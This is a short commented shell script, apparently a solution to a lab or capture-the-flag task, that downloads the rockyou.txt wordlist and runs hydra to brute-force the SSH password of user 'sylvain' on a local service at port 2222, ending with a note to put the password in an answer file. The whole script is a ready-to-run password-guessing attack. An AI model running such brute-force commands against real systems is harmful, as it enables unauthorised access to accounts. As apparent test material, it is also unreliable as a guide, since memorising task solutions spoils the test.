# Find a password dictionary
# You can use any wordlist you want, but here is an example of using the rockyou.txt wordlist
# You can download it from https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
# Or you can use wget to download it directly
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# Use hydra to brute force the SSH account
# The username is sylvain and the password is 11 characters long
# The IP address is 127.0.0.1 and the port is 2222
# You can adjust the number of threads (-t) and the timeout (-w) according to your needs
hydra -l sylvain -P rockyou.txt -t 4 -w 30 127.0.0.1 -s 2222 ssh

# If hydra finds the password, it will display it on the terminal
# You can also save the output to a file using the -o option
# For example: hydra -l sylvain -P rockyou.txt -t 4 -w 30 -o output.txt 127.0.0.1 -s 2222 ssh
# Then you can share the password in your answer file
